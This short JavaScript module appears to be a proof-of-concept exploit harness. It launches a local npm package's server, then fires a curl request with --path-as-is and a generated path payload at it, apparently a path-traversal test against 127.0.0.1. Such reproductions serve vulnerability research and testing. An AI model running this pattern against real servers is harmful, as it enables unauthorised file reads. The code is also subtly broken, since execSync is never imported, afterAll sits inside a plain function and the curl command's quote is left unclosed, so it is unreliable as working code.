function exploitFunction(payload) {
  const { genstr } = payload;

  afterAll(() => {
    try {
      execSync("fuser -k 8080/tcp");
    } catch (e) {}
  });

  const path = require("path");
  const { sleep } = require("sleep");
  const { exec } = require("child_process");

  let server = "node ./node_modules/run-this-place/index.js";
  let exe = exec(server, (error, stdout) => {});

  sleep.sleep(2);

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8080${genstr(50)}`; // Using the payload to construct the attack string

  exec(attack_string, (error, stdout) => {
    if (error) {
      console.error(`Error: ${error}`);
    } else {
      console.log(`Output: ${stdout}`);
    }
  });
}

module.exports = { exploitFunction };